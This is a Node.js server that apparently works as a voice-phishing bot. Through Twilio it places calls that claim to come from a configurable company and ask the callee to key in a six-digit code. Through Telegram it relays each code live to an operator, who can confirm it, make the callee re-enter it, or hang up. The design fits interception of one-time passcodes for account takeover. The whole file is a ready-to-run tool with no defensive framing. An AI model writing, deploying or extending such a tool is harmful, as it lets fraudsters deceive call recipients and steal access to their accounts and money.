const express = require("express")
const bodyParser = require("body-parser")
const fetch = require("node-fetch")
const twilio = require("twilio")

const app = express()
app.use(bodyParser.urlencoded({extended:false}))
app.use(bodyParser.json())

const PORT = process.env.PORT || 3000

// ===== ENV =====
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN
const CHAT_ID = process.env.CHAT_ID

const TWILIO_ACCOUNT_SID =
process.env.TWILIO_ACCOUNT_SID || process.env.TWILIO_SID

const TWILIO_AUTH_TOKEN =
process.env.TWILIO_AUTH_TOKEN || process.env.TWILIO_TOKEN

const TWILIO_NUMBER = process.env.TWILIO_NUMBER
const BASE_URL = process.env.BASE_URL

const client = twilio(
TWILIO_ACCOUNT_SID,
TWILIO_AUTH_TOKEN
)

// ===== SETTINGS =====
let settings = {
company:"Support",
digits:6,
assistant:0,
itemName:"reference number",
maxRetries:3,
paused:false
}

const assistants = [
{name:"Nova",voice:"Polly.Joanna"},
{name:"Lyra",voice:"Polly.Matthew"},
{name:"Orion",voice:"Polly.Amy"},
{name:"Astra",voice:"Polly.Brian"},
{name:"Kairo",voice:"Polly.Justin"},
{name:"Solara",voice:"Polly.Kendra"}
]

// ===== STATE =====
const calls = new Map()

let lastCaller = null
let lastDialed = null

let logs = []
let history = []

let stats = {
inbound:0,
outbound:0,
inputs:0,
confirmed:0,
retries:0,
hungup:0
}

let panelMessageId = null
let pendingInput = null

// ===== HELPERS =====
function assistant(){
return assistants[settings.assistant]
}

function pushLog(text){
logs.unshift(`${new Date().toLocaleTimeString()} ${text}`)
logs = logs.slice(0,30)
}

function pushHistory(text){
history.unshift(`${new Date().toLocaleString()} ${text}`)
history = history.slice(0,100)
}

function getCall(sid){

if(!calls.has(sid)){

calls.set(sid,{
sid,
caller:null,
input:null,
status:"Idle",
startedAt:Date.now(),
retries:0
})

}

return calls.get(sid)
}

function callTime(call){

const sec=Math.floor((Date.now()-call.startedAt)/1000)

const m=String(Math.floor(sec/60)).padStart(2,"0")
const s=String(sec%60).padStart(2,"0")

return `${m}:${s}`
}

// ===== TELEGRAM =====
async function tg(method,data){

const res=await fetch(
`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,
{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify(data)
})

return res.json()
}

async function tgSend(text,buttons=null){

const body={
chat_id:CHAT_ID,
text
}

if(buttons){
body.reply_markup={inline_keyboard:buttons}
}

return tg("sendMessage",body)
}

async function tgEdit(id,text,buttons=null){

const body={
chat_id:CHAT_ID,
message_id:id,
text
}

if(buttons){
body.reply_markup={inline_keyboard:buttons}
}

return tg("editMessageText",body)
}

// ===== PANEL =====
function panelButtons(){

return [

[
{text:"✔ Confirm",callback_data:"confirm"},
{text:"🔁 Retry",callback_data:"retry"}
],

[
{text:"⛔ Hang Up",callback_data:"hangup"}
],

[
{text:"📞 Call Last",callback_data:"calllast"},
{text:"📲 Call",callback_data:"call"}
],

[
{text:"⏸ Pause",callback_data:"pause"},
{text:"▶ Resume",callback_data:"resume"}
],

[
{text:"⚡ Wake Server",callback_data:"wake"}
],

[
{text:"📊 Status",callback_data:"status"},
{text:"📜 Logs",callback_data:"logs"}
]

]

}

function panelText(){

const active=[...calls.values()]
.filter(c=>c.status!=="Ended")
.slice(0,6)

let text="📞 LIVE CALLS\n\n"

if(!active.length){
text+="No active calls\n\n"
}else{

active.forEach((c,i)=>{

text+=`${i+1}) ${c.status}\n`
text+=`Caller: ${c.caller||"Unknown"}\n`
text+=`${settings.itemName}: ${c.input||"waiting"}\n`
text+=`Retries: ${c.retries}/${settings.maxRetries}\n`
text+=`Time: ${callTime(c)}\n\n`

})

}

text+=`Company: ${settings.company}\n`
text+=`Digits: ${settings.digits}\n`
text+=`Assistant: ${assistant().name}\n`
text+=`Item: ${settings.itemName}\n`
text+=`Paused: ${settings.paused?"Yes":"No"}`

return text
}

async function updatePanel(force=false){

const text=panelText()
const buttons=panelButtons()

if(!panelMessageId||force){

const msg=await tgSend(text,buttons)

if(msg.result){
panelMessageId=msg.result.message_id
}

return
}

await tgEdit(panelMessageId,text,buttons)

}

// ===== CALL CONTROL =====
async function startCall(number){

if(settings.paused){
await tgSend("⏸ Calling paused")
return
}

lastDialed=number
stats.outbound++

await client.calls.create({
url:`${BASE_URL}/ivr`,
to:number,
from:TWILIO_NUMBER,
statusCallback:`${BASE_URL}/call-status`,
statusCallbackEvent:[
"initiated",
"ringing",
"answered",
"completed"
],
statusCallbackMethod:"POST"
})

pushLog(`Outbound call to ${number}`)
pushHistory(`Outbound call ${number}`)

}

// ===== ROUTES =====
app.get("/",(req,res)=>{
res.send("Server running")
})

app.get("/ping",(req,res)=>{
res.send("pong")
})

app.get("/health",(req,res)=>{
res.json({
status:"ok",
calls:calls.size,
paused:settings.paused
})
})

// ===== CALL STATUS =====
app.post("/call-status",async(req,res)=>{

const sid=req.body.CallSid
const from=req.body.From
const status=req.body.CallStatus

const call=getCall(sid)

if(from)call.caller=from

if(status==="ringing")call.status="Ringing"
if(status==="in-progress")call.status="Answered"

if(status==="completed"){
call.status="Ended"
}

updatePanel()

res.sendStatus(200)

})

// ===== IVR =====
app.post("/ivr",(req,res)=>{

const sid=req.body.CallSid
const from=req.body.From

const call=getCall(sid)

call.caller=from
call.status="Answered"

stats.inbound++

lastCaller=from

res.type("text/xml")

res.send(`
<Response>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/input" method="POST">
<Say voice="${assistant().voice}">
Hello im calling from ${settings.company}.
Please enter your ${settings.digits} digit ${settings.itemName}.
</Say>
</Gather>
<Redirect method="POST">${BASE_URL}/ivr</Redirect>
</Response>
`)

})

// ===== INPUT =====
app.post("/input",async(req,res)=>{

const digits=req.body.Digits
const sid=req.body.CallSid
const caller=req.body.From

const call=getCall(sid)

call.input=digits
call.caller=caller

stats.inputs++

pushLog(`${caller} : ${digits}`)
pushHistory(`${caller} -> ${digits}`)

await tgSend(`📞 INPUT RECEIVED

Caller: ${caller}
${settings.itemName}: ${digits}`)

updatePanel()

res.type("text/xml")

res.send(`
<Response>
<Say voice="${assistant().voice}">
Please wait while we review your ${settings.itemName}.
</Say>
<Pause length="10"/>
<Redirect method="POST">${BASE_URL}/ivr</Redirect>
</Response>
`)

})

// ===== TELEGRAM =====
app.post("/telegram", async (req,res)=>{

try{

const update=req.body || {}

// BUTTONS
if(update.callback_query){

const action=update.callback_query.data
const call=[...calls.values()].find(c=>c.status!=="Ended")

if(action==="confirm"&&call){

await client.calls(call.sid).update({
twiml:`
<Response>
<Say voice="${assistant().voice}">
Thank you your ${settings.itemName} has been confirmed
</Say>
<Hangup/>
</Response>
`
})

call.status="Ended"

stats.confirmed++

}

if(action==="retry"&&call){

call.retries++

if(call.retries>=settings.maxRetries){

await client.calls(call.sid).update({
twiml:`
<Response>
<Say>Verification failed</Say>
<Hangup/>
</Response>
`
})

}else{

await client.calls(call.sid).update({
twiml:`
<Response>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/input">
<Say>Please re enter your ${settings.itemName}</Say>
</Gather>
</Response>
`
})

}

stats.retries++

}

if(action==="hangup"&&call){

await client.calls(call.sid).update({
twiml:`<Response><Hangup/></Response>`
})

call.status="Ended"

stats.hungup++

}

if(action==="calllast"&&lastDialed){
await startCall(lastDialed)
}

if(action==="pause"){
settings.paused=true
}

if(action==="resume"){
settings.paused=false
}

if(action==="wake"){
await fetch(BASE_URL)
await fetch(BASE_URL+"/ping")
await tgSend("⚡ Server wake request sent")
}

updatePanel()

}

// COMMANDS
if(update.message&&update.message.text){

const text=update.message.text.trim()

if(text==="/panel"||text==="/menu"){
panelMessageId=null
await updatePanel(true)
}

if(text==="/logs"){
await tgSend(logs.join("\n"))
}

if(text==="/history"){
await tgSend(history.join("\n"))
}

if(text==="/stats"){

await tgSend(`Stats

Inbound: ${stats.inbound}
Outbound: ${stats.outbound}
Inputs: ${stats.inputs}
Confirmed: ${stats.confirmed}
Retries: ${stats.retries}
HungUp: ${stats.hungup}`)

}

if(text.startsWith("/call ")){

const number=text.split(" ")[1]
await startCall(number)

}

if(text.startsWith("/company")){

settings.company=text.replace("/company","").trim()
updatePanel()

}

if(text.startsWith("/item")){

settings.itemName=text.replace("/item","").trim()
updatePanel()

}

if(text.startsWith("/digits")){

settings.digits=parseInt(text.split(" ")[1])
updatePanel()

}

if(text.startsWith("/assistant")){

settings.assistant=parseInt(text.split(" ")[1])-1
updatePanel()

}

}

}catch(e){

console.log("/telegram error",e.message)

}

res.sendStatus(200)

})

// ===== PANEL REFRESH =====
setInterval(()=>{

if(panelMessageId){
updatePanel()
}

},1000)

app.listen(PORT,()=>{

console.log("Server booted and ready for calls")

})
